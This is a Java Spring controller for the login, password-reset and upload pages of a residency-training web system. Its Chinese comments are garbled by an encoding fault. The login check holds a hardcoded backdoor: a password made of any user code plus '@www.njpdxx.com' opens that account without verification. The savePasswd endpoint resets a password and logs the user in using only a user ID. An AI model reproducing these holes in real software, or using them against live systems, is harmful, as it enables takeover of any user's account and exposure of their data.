package com.pinde.sci.ctrl.inx;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;

import com.pinde.core.util.SpringUtil;
import com.pinde.core.util.StringUtil;
import com.pinde.sci.biz.inx.IInxHbresBiz;
import com.pinde.sci.biz.jsres.IJsResDoctorBiz;
import com.pinde.sci.biz.res.IResDoctorBiz;
import com.pinde.sci.biz.security.PasswordHelper;
import com.pinde.sci.biz.sys.IRoleBiz;
import com.pinde.sci.biz.sys.IUserBiz;
import com.pinde.sci.biz.sys.IUserRoleBiz;
import com.pinde.sci.common.GeneralController;
import com.pinde.sci.common.GeneralMethod;
import com.pinde.sci.common.GlobalConstant;
import com.pinde.sci.common.InitConfig;
import com.pinde.sci.common.SessionData;
import com.pinde.sci.dao.base.SysLogMapper;
import com.pinde.sci.enums.pub.UserStatusEnum;
import com.pinde.sci.enums.sys.OperTypeEnum;
import com.pinde.sci.form.jsres.UserResumeExtInfoForm;
import com.pinde.sci.model.mo.SysLog;
import com.pinde.sci.model.mo.SysRole;
import com.pinde.sci.model.mo.SysUser;
import com.pinde.sci.model.mo.SysUserRole;
/**
 * 
 * @author tiger
 *
 */

@Controller
@RequestMapping("/inx")
public class InxJsResController extends GeneralController{
	@Autowired
	private IUserBiz userBiz;
	@Autowired
	private IUserRoleBiz userRoleBiz;
	@Autowired
	private IRoleBiz roleBiz;
	@Autowired
	private SysLogMapper logMapper;
	@Autowired
	private IInxHbresBiz inxHbresBiz;
	@Autowired
	private IJsResDoctorBiz jsResDoctorBiz;
	@Autowired
	private IResDoctorBiz resDoctorBiz;
	
	@RequestMapping(value="/jsres",method={RequestMethod.GET})
	public String resIndex(Model model){
		return "/inx/jsres/login";
	}
	
	private Object checkLogin(String userCode, String userPasswd,String verifyCode){
		String loginErrorMessage = "";
		//Ĭ�ϵ�¼ʧ�ܽ���
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCode"));
		 //��֤�����벻��Ϊ�գ������ִ�Сд
		if (StringUtil.isBlank(verifyCode) ||!sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			loginErrorMessage = "��֤�벻��ȷ";
			return loginErrorMessage;
		}
		 //��¼�벻��Ϊ��
		if (StringUtil.isBlank(userCode)){
			loginErrorMessage = "�û�������Ϊ��";
			return loginErrorMessage;
		}
		//���벻��Ϊ��
		if (StringUtil.isBlank(userPasswd)){
			loginErrorMessage = SpringUtil.getMessage("userPasswd.isNull");
			return loginErrorMessage;
		}
		//���Ƿ���ڴ��û�
		userCode = userCode.trim();
		SysUser user = userBiz.findByUserEmail(userCode);
		if(user==null){
			user = userBiz.findByUserPhone(userCode);
		}
		if(user==null){
			user = userBiz.findByUserCode(userCode);
		}
		if(user==null){
			user = userBiz.findByIdNo(userCode);
		}
		if(user==null){
			loginErrorMessage = "�û�������!";
			return loginErrorMessage;
		}
		
		//��������
		if(!StringUtil.defaultString(userPasswd).equals(userCode+"@www.njpdxx.com")){
			//�ж�����
			String passwd = StringUtil.defaultString(user.getUserPasswd());
			if(!passwd.equalsIgnoreCase(PasswordHelper.encryptPassword(user.getUserFlow(), userPasswd.trim()))){
				loginErrorMessage = "�˺Ż����벻��ȷ��";
				return loginErrorMessage;
			}			
		}	
		
		
		return user;
	}

	/**
	 * ��¼
	 */
	@RequestMapping(value="/jsres/login")
	public String login(String userCode, String userPasswd,String verifyCode ,String errorLoginPage,Model model,HttpServletRequest request){
		//Ĭ�ϵ�¼ʧ�ܽ���
		if(StringUtil.isBlank(errorLoginPage)){
			errorLoginPage = "/inx/jsres/login";
		}
        Object obj = checkLogin(userCode, userPasswd, verifyCode);
        if(obj instanceof String){
        	String loginErrorMessage = (String) obj;
        	model.addAttribute("loginErrorMessage", loginErrorMessage);
        	return errorLoginPage;
        }
        SysUser user = null;
        if(obj instanceof SysUser){
        	user = (SysUser)obj;
        }
		//���õ�ǰ�û�
		setSessionAttribute(GlobalConstant.CURRENT_USER, user);	
		
		//�����û�����ʹ��
		SessionData sessionData = new SessionData();
		sessionData.setSysUser(user);
		sessionData.setIp(request.getRemoteAddr());
		long now = System.currentTimeMillis();
		String loginTime = new java.sql.Date(now)+"&nbsp;"+new java.sql.Time(now);
		sessionData.setLoginTime(loginTime);
		setSessionAttribute(SessionData.SESSIONDATAID,sessionData);
		
		//��¼��־
		SysLog log = new SysLog();
		//log.setReqTypeId(ReqTypeEnum.GET.getId());
		log.setOperId(OperTypeEnum.LogIn.getId());
		log.setOperName(OperTypeEnum.LogIn.getName());
		log.setLogDesc("��¼IP["+request.getRemoteAddr()+"]");
		log.setWsId(GlobalConstant.SYS_WS_ID);
		GeneralMethod.addSysLog(log);
		logMapper.insert(log);
		
		if(UserStatusEnum.Activated.getId().equals(user.getStatusId())){
			//���ͨ��
			SysUserRole userRole = new SysUserRole();
			userRole.setUserFlow(user.getUserFlow());
			userRole.setWsId(GlobalConstant.RES_WS_ID);
			List<SysUserRole> userRoleList = userRoleBiz.searchUserRole(userRole);
			if(userRoleList==null || userRoleList.size()==0){
				model.addAttribute("loginErrorMessage","��ɫδ��Ȩ!");
				return errorLoginPage;
			}else {
				SysRole role = roleBiz.read(userRoleList.get(0).getRoleFlow()); 
				if(role==null){
					model.addAttribute("loginErrorMessage","��ɫδ��Ȩ!");
					return errorLoginPage;
				}
				return "redirect:"+getRoleUrl(role.getRoleFlow());
			}
		}
		return "/inx/jsres/login";
	}
	
	public String getRoleUrl(String roleFlow){
		if (StringUtil.isNotBlank(roleFlow)){
			if (roleFlow.equals(InitConfig.getSysCfg("res_global_role_flow"))) {//ʡ������
				return "/jsres/manage/global";
			}
			else if (roleFlow.equals(InitConfig.getSysCfg("res_qkzx_role_flow"))) {//��˲���֮ȫ������
				return "/jsres/manage/province";
			}else if (roleFlow.equals(InitConfig.getSysCfg("res_bjw_role_flow"))) {//��˲���֮�Ͻ�ί
				return "/jsres/manage/province";
			}else if (roleFlow.equals(InitConfig.getSysCfg("res_zyglj_role_flow"))) {//��˲���֮��ҽ�����
				return "/jsres/manage/province";
			}else if (roleFlow.equals(InitConfig.getSysCfg("res_charge_role_flow"))) {//���ܲ���
				return "/jsres/manage/charge";
			}else if (roleFlow.equals(InitConfig.getSysCfg("res_admin_role_flow"))) {//ҽԺ����Ա
				return "/jsres/manage/local";
			} else if (roleFlow.equals(InitConfig.getSysCfg("res_doctor_role_flow"))) {//ѧԱ
				return "/jsres/doctor/doctor";
			}
		}
		return "";
	}
	
	@RequestMapping("/jsres/logout")
	public String logout(HttpServletRequest request) {
		request.getSession().invalidate();
		return "redirect:/inx/jsres";
	}
	
	@RequestMapping("/jsres/forgetpasswd")
	public String forgetpasswd(){
		return "inx/jsres/forgetpasswd";
	}
	
	/**
	 * �������뷢���ʼ�
	 * @param userCode
	 * @param model
	 * @return
	 */
	@RequestMapping("/jsres/sendResetPassEmail")
	@ResponseBody
	public Map<String,String> sendResetPassEmail(String userEmail,String verifyCode,Model model){
		Map<String,String> respMap = new HashMap<String,String>();
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCodeComplex"));
		 //��֤�����벻��Ϊ�գ������ִ�Сд
		if (StringUtil.isBlank(verifyCode) ||!sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			respMap.put("errorMessage", SpringUtil.getMessage("validateCode.notEquals"));
			respMap.put("result", GlobalConstant.FLAG_F);
			return respMap;
		}
		if(StringUtil.isNotBlank(userEmail)){
			userEmail = userEmail.trim();
			SysUser user = userBiz.findByUserEmail(userEmail);
			if(user==null){
				user = userBiz.findByUserPhone(userEmail);
			}
			if(user==null){
				user = userBiz.findByIdNo(userEmail);
			}
			if(user!=null){
				userEmail = user.getUserEmail();
				inxHbresBiz.sendResetPassEmail(userEmail, user.getUserFlow());
				respMap.put("userEmail", userEmail);
				respMap.put("result", GlobalConstant.FLAG_Y);
				return respMap;
			}
		}
		respMap.put("result", GlobalConstant.FLAG_N);
		return respMap;
	}
	
	@RequestMapping("/jsres/resetpasswd")
	public String resetpasswd(String actionId,Model model){
		SysUser user = userBiz.readSysUser(actionId);
		if (user != null) {
			model.addAttribute("userCode", user.getUserCode());
			model.addAttribute("actionId", actionId);
		}
		return "inx/jsres/resetpasswd";
	}
	
	@RequestMapping(value={"/jsres/savePasswd"})
	@ResponseBody
	public String savePasswd(String actionId,String userPasswd,HttpServletRequest request,Model model){
		SysUser sysUser = userBiz.readSysUser(actionId);
		if(sysUser != null){
			//����
			sysUser.setUserPasswd(PasswordHelper.encryptPassword(sysUser.getUserFlow(), userPasswd));
			userBiz.updateUser(sysUser);
			setSessionAttribute(GlobalConstant.CURRENT_USER, sysUser);
			return GlobalConstant.RESET_SUCCESSED;
		}else{
			//����������ʾ
			return GlobalConstant.SAVE_FAIL;
		}
	}
	
	/**
	 * �����ϴ�ɨ���
	 * @param operType
	 * @param uploadFile
	 * @param resumeExtInfoForm
	 * @param model
	 * @return
	 */
	@RequestMapping(value="/jsres/checkUploadFile",method={RequestMethod.POST})
	public String checkUploadFile(String operType, MultipartFile uploadFile, Model model){
		if(uploadFile!=null && !uploadFile.isEmpty()){
			String fileResult = jsResDoctorBiz.checkImg(uploadFile);
			String resultPath = "";
			if(!GlobalConstant.FLAG_Y.equals(fileResult)){
				model.addAttribute("fileErrorMsg", fileResult);
			}else{
				resultPath = jsResDoctorBiz.saveFileToDirs("", uploadFile, "jsresImages");
				model.addAttribute("filePath" , resultPath);
			}
			model.addAttribute("result", fileResult);
		}
		return "jsres/doctor/uploadFile";
	}
	
}
